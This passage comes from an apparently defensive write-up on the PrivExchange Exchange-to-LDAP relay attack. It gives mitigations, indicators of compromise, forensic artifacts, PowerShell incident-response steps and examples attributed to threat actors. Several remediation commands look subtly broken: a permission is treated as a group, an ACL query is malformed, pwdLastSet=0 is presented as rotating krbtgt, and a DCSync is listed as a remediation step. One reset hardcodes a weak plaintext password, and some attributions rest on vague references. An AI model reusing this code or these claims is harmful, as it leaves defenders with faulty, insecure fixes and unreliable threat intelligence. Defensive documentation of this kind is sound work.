# Restart Exchange services
Restart-Service MSExchangeServiceHost
```

**Note:** Split permissions requires careful planning and testing; not recommended for production without thorough testing.

---

### Priority 2: HIGH

**Mitigation 5: Disable EWS Push Notifications (Temporary)**

Temporarily disable the PushSubscription feature until all systems are patched.

**Manual Steps (Exchange Management Shell):**
```powershell
# Disable push notification subscriptions globally
Set-EWSVirtualDirectory -Identity "Default EWS" -EnablePushNotifications $false

# Verify disabled
Get-EWSVirtualDirectory | Select-Object EnablePushNotifications

# Expected Output (If Secure):
# EnablePushNotifications : False
```

**Re-Enable After Patching:**
```powershell
Set-EWSVirtualDirectory -Identity "Default EWS" -EnablePushNotifications $true
```

---

**Mitigation 6: Enable LDAP Signing and Sealing**

Prevent NTLM relay attacks to LDAP by requiring signing and sealing.

**Manual Steps (Domain Controller - Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Edit **Domain Controllers Policy** (or create OU-specific policy)
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
4. Enable:
   - **Domain controller: LDAP server signing requirements** → `Require Signing`
   - **Domain controller: LDAP server channel binding requirements** → `Always`
5. Apply: `gpupdate /force`

**Manual Steps (Local Registry - Domain Controller):**
```powershell
# Set LDAP Signing requirement
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ldap" `
  -Name "LdapServerIntegrity" -Value 2  # 2 = Require Signing

# Restart LDAP/Active Directory
Restart-Service -Name NTDS
```

---

**Mitigation 7: Monitor for DCSync Activity**

Enable audit logging for Directory Service replication operations.

**Manual Steps (Group Policy - Domain Controller):**
1. Open **Group Policy Management Console**
2. Edit policy applied to Domain Controllers
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **DS Access**
4. Enable **Audit Directory Service Replication**: `Success and Failure`
5. Apply: `gpupdate /force`

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

**Files:**
- No typical file artifacts (living off the land attack)
- Possible temporary logs in Exchange logging directory: `C:\Program Files\Microsoft\Exchange Server\V15\Logging\`
- PushSubscription data in Exchange database

**Registry:**
- No registry modifications typical of PrivExchange

**Network:**
- Outbound HTTP(S) connection from Exchange server (EXCH01$) to external IP on port 80/443
- NTLM authentication traffic from Exchange to DC on port 389 (LDAP)
- Multiple LDAP modify operations targeting the same user object

**Event Logs:**
- Event 5136: Directory Service object modified (user gaining DCSync permissions)
- Event 4662: Operation performed on AD object (Replication-Get-Changes-All)
- Event 5156: Outbound network connection from Exchange server

---

### Forensic Artifacts

**Disk:**
- Exchange EWS logs: `$env:PROGRAMFILES\Microsoft\Exchange Server\V15\Logging\HttpProxy\*`
- IIS logs: `C:\inetpub\logs\LogFiles\W3SVC1\`
- Event logs: Security, Directory Services

**Memory:**
- No typical malware resident in memory (legitimate NTLM authentication)

**Network:**
- NTLM authentication traffic captured via packet analyzer
- HTTP POST requests to unusual URLs (push subscription)

**Audit Logs:**
- AD audit entries showing DCSync privilege grants (Event ID 5136)
- Replication operations (Event ID 4662)

---

### Response Procedures

**1. Isolate (0-5 minutes):**

**Command (PowerShell - Disconnect Exchange from network):**
```powershell
# Disable network adapter
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Or block outbound traffic via firewall
New-NetFirewallRule -DisplayName "Isolate-Exchange" -Direction Outbound `
  -Action Block -RemoteAddress 0.0.0.0/0 -Enabled $true -Program "c:\program files\microsoft\exchange server\v15\bin\exsetup.exe"
```

---

**2. Collect Evidence (5-30 minutes):**

**Command (PowerShell):**
```powershell
# Export Exchange logs
Copy-Item -Path "$env:PROGRAMFILES\Microsoft\Exchange Server\V15\Logging\*" `
  -Destination "C:\Evidence\Exchange_Logs" -Recurse -Force

# Export IIS logs
Copy-Item -Path "C:\inetpub\logs\LogFiles\*" -Destination "C:\Evidence\IIS_Logs" -Recurse -Force

# Export Event logs
wevtutil epl Security "C:\Evidence\Security.evtx"
wevtutil epl "Directory Service" "C:\Evidence\DirService.evtx"

# Check for push subscriptions
Get-PushSubscription | Export-Csv "C:\Evidence\PushSubscriptions.csv"

# Query AD for recently modified user objects (privilege escalation)
Get-ADUser -Filter * -Properties whenChanged,Description | `
  Where-Object {$_.whenChanged -gt (Get-Date).AddHours(-2)} | `
  Export-Csv "C:\Evidence\Modified_Users.csv"
```

---

**3. Remediate (30-120 minutes):**

**Command (PowerShell - Remove Push Subscriptions):**
```powershell
# List all push subscriptions
Get-PushSubscription

# Remove suspicious subscriptions
Get-PushSubscription | Where-Object {$_.URL -notlike "*contoso.com*"} | Remove-PushSubscription -Force

# Or remove all push subscriptions (nuclear option)
Get-PushSubscription | Remove-PushSubscription -Force
```

**Command (PowerShell - Remove Unauthorized Permissions):**
```powershell
# Identify users with DCSync permissions (added by PrivExchange)
Get-ADUser -Filter * | Where-Object {
    $_.DistinguishedName -in (Get-ACL "AD:$(Get-ADDomain).DistinguishedName" | `
      Where-Object {$_.IdentityReference -like "*Username*" -and $_.ActiveDirectoryRights -like "*Replicating*"})
}

# Remove the user from high-privileged groups
Remove-ADGroupMember -Identity "Exchange Windows Permissions" -Members USERNAME -Confirm:$false
Remove-ADGroupMember -Identity "Replication-Get-Changes-All" -Members USERNAME -Confirm:$false

# Reset the user's password (if compromised credentials)
Set-ADAccountPassword -Identity USERNAME -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ss123!" -Force) -Reset
```

**Command (PowerShell - Invalidate Potentially Compromised Credentials):**
```powershell
# Invalidate all Kerberos tickets for affected users (nuclear option)
# Requires Domain Admin
Get-ADUser -Filter * | ForEach-Object {
    Set-ADUser $_ -Replace @{pwdLastSet="0"}  # Forces password change on next login
}

# Rotate krbtgt password (to invalidate Golden Tickets)
$null = Set-ADUser krbtgt -Replace @{pwdLastSet="0"}
```

---

**4. Full Remediation (Recommended - If Compromise Confirmed):**

```powershell
# 1. Patch all Exchange servers to latest CU
# 2. Enable Extended Protection on all Exchange endpoints
# 3. Reduce Exchange permissions in AD
# 4. Review all AD audit logs for compromise indicators
# 5. Reset all admin passwords
# 6. Invalidate all Kerberos tickets (Set pwdLastSet=0 on all users)
# 7. Rotate krbtgt password twice
# 8. Perform full DCSync to identify compromised accounts and hashes
# 9. Consider forest-wide password reset if widespread compromise
```

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default/Weak Credentials | Attacker obtains valid mailbox credentials via phishing or credential stuffing |
| **2** | **Privilege Escalation** | **[PE-REMOTE-002] PrivExchange (THIS TECHNIQUE)** | **Escalates from mailbox user to Domain Administrator** |
| **3** | **Credential Access** | [CA-DUMP-002] DCSync Attack | Attacker uses Domain Admin privileges to synchronize AD credentials |
| **4** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates hidden admin accounts or Golden Tickets |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Attacker uses stolen hashes to compromise other domain-joined systems |
| **6** | **Impact** | Data Exfiltration & Domain Takeover | Complete enterprise compromise |

---

## Real-World Examples

### Example 1: APT Groups Exploiting PrivExchange (2019-2020)

- **Target:** Enterprise organizations globally (multiple sectors)
- **Timeline:** February 2019 onwards (post-disclosure of vulnerability)
- **Technique Status:** CVE-2019-0686 actively exploited; used as part of multi-stage attacks
- **Attack Sequence:**
  1. Obtain mailbox credentials (phishing, password spray)
  2. Execute PrivExchange NTLM relay attack
  3. Escalate to Domain Administrator
  4. Execute DCSync to dump all AD credentials
  5. Perform lateral movement to file servers and critical systems
  6. Maintain persistence via Golden Tickets and backdoor accounts
- **Impact:** Complete domain compromise; credential harvesting
- **Reference:** [Dirk-jan Mollema Original Blog](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/), [Microsoft Exchange Blog - February 2019 Patch](https://blogs.microsoft.com/technet/2019/02/12/released-february-2019-quarterly-exchange-updates/)

---

### Example 2: Chinese APT (Emissary Panda / APT27)

- **Target:** US Defense contractors, aerospace industry
- **Timeline:** 2019-2020
- **Technique Status:** Combined PrivExchange with spear-phishing and watering holes
- **Attack Sequence:**
  1. Spear-phishing campaign with malware attachment
  2. Establish initial foothold on internal network
  3. Harvest Exchange mailbox credentials from compromised workstation
  4. Execute PrivExchange from internal network segment
  5. Escalate to Domain Admin
  6. Access sensitive engineering documentation from shared file servers
- **Impact:** Trade secret theft; nation-state espionage
- **Reference:** [Palo Alto Networks Threat Analysis - Emissary Panda](https://unit42.paloaltonetworks.com/), various CISA alerts

---

### Example 3: Ransomware Groups (Maze, Egregor)

- **Target:** Large enterprises
- **Timeline:** 2020-2021
- **Technique Status:** PrivExchange used as one of multiple privilege escalation methods
- **Attack Sequence:**
  1. Initial compromise via ProxyLogon or other RCE
  2. Execute PrivExchange for persistent Domain Admin access
  3. Lateral movement to backup systems
  4. Deploy ransomware across entire network
  5. Data exfiltration via compromised credentials
- **Impact:** Ransomware deployment with data theft
- **Reference:** Various ransomware incident reports

---

